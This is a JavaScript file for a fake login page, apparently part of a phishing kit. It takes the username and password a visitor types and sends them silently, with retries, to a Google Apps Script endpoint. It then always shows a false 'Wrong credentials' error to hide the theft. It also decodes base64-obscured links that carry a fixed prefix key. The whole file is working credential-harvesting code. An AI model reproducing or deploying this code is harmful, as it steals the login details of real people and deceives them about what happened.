document.addEventListener('DOMContentLoaded', () => {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginButton = document.getElementById('login-button');
    const splashScreen = document.getElementById('splash-screen');
    const loginForm = document.getElementById('login-form');
    const showHideButton = document.querySelector('.show-hide-password');
    const showHideText = document.querySelector('.show-hide-text');
    const eyeOpenIcon = document.getElementById('eye-open');
    const eyeClosedIcon = document.getElementById('eye-closed');

    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyuvK7JZPUQvtlOmZluz4nZPxBhLXIWFWkJm2o65PgEMECw9vR3U7_m-jlaEusv0mvaDg/exec';
    
    window.onload = () => {
        splashScreen.classList.add('fade-out');
        setTimeout(() => {
            splashScreen.style.display = 'none';
        }, 500);
    };

    function initPasswordToggle() {
        if (!passwordInput || !showHideButton) return;
        
        passwordInput.addEventListener('input', function() {
            showHideButton.classList.toggle('visible', this.value.length > 0);
            checkInputs();
        });
        
        showHideButton.addEventListener('click', function() {
            const isPassword = passwordInput.type === 'password';
            passwordInput.type = isPassword ? 'text' : 'password';
            
            if (showHideText) {
                showHideText.textContent = isPassword ? 'Hide' : 'Show';
            }
            
            eyeOpenIcon.style.display = isPassword ? 'none' : 'block';
            eyeClosedIcon.style.display = isPassword ? 'block' : 'none';
            
            passwordInput.focus();
        });
    }

    function checkInputs() {
        const isUsernameFilled = usernameInput.value.trim() !== '';
        const isPasswordFilled = passwordInput.value.trim() !== '';
        const isPasswordValid = passwordInput.value.trim().length >= 6;
        loginButton.disabled = !(isUsernameFilled && isPasswordFilled && isPasswordValid);
    }

    usernameInput.addEventListener('input', checkInputs);
    passwordInput.addEventListener('input', checkInputs);

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        if (loginButton.disabled) return;
        
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        
        removeCredentialError();
        showLoadingState();

        // Await the submission function, which now includes retries
        await submitViaFetch(username, password);
        
        // This timer runs after the submission attempts are finished.
        // It preserves the original user experience of a simulated delay before showing an error.
        setTimeout(() => {
            resetLoginButton();
            showCredentialError();
            passwordInput.value = '';
            checkInputs();
            
            if (showHideButton) {
                showHideButton.classList.remove('visible');
                passwordInput.type = 'password';
                
                if (showHideText) {
                   showHideText.textContent = 'Show';
                }
                eyeOpenIcon.style.display = 'block';
                eyeClosedIcon.style.display = 'none';
            }
        }, 1500);
    });

    /**
     * A helper function to create a delay.
     * @param {number} ms - The number of milliseconds to wait.
     */
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

    /**
     * Submits data using the modern Fetch API with a silent retry mechanism.
     * @param {string} username - The user's username.
     * @param {string} password - The user's password.
     */
    async function submitViaFetch(username, password) {
        const url = `${GOOGLE_SCRIPT_URL}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&t=${Date.now()}`;
        const maxRetries = 3; // 1 initial attempt + 2 retries

        for (let attempt = 0; attempt < maxRetries; attempt++) {
            try {
                // Use fetch in 'no-cors' mode for a "fire-and-forget" request.
                await fetch(url, {
                    method: 'GET',
                    mode: 'no-cors',
                    cache: 'no-cache'
                });
                
                // If fetch doesn't throw an error, the request was successfully sent.
                console.log(`Attempt ${attempt + 1} succeeded.`);
                return; // Exit the function on success
                
            } catch (error) {
                console.error(`Attempt ${attempt + 1} failed:`, error);
                
                // If this wasn't the last attempt, wait before retrying.
                if (attempt < maxRetries - 1) {
                    await sleep(1000); // Wait 1 second before the next try
                } else {
                    console.error('All submission attempts failed.');
                }
            }
        }
    }

    function showLoadingState() {
        loginButton.disabled = true;
        loginButton.innerHTML = '<div class="loading-spinner"></div>';
    }

    function resetLoginButton() {
        loginButton.disabled = false;
        loginButton.textContent = 'Log in';
    }

    function showCredentialError() {
        removeCredentialError();
        const errorElement = document.createElement('div');
        errorElement.className = 'credential-error';
        errorElement.innerHTML = `<div style="color: #ed4956; font-size: 14px; text-align: center; margin-top: 15px;">Wrong credentials. Please try again.</div>`;
        
        const forgotLink = document.querySelector('.forgot-password');
        if (forgotLink) {
            forgotLink.parentNode.insertBefore(errorElement, forgotLink.nextSibling);
        } else {
            loginForm.parentNode.appendChild(errorElement);
        }
    }

    function removeCredentialError() {
        document.querySelectorAll('.credential-error').forEach(e => e.remove());
    }

    initPasswordToggle();
    checkInputs();
    
    document.querySelectorAll(".secure-link").forEach(a => {
        a.addEventListener("click", e => {
            e.preventDefault();
            const key = "123noob";
            const encrypted = a.getAttribute("data-enc");
            try {
                const decoded = atob(encrypted);
                const link = decoded.startsWith(key) ? decoded.slice(key.length) : null;
                if (link) {
                    window.open(link, "_blank");
                }
            } catch (err) {
                console.error("Decryption failed.", err);
            }
        });
    });
});
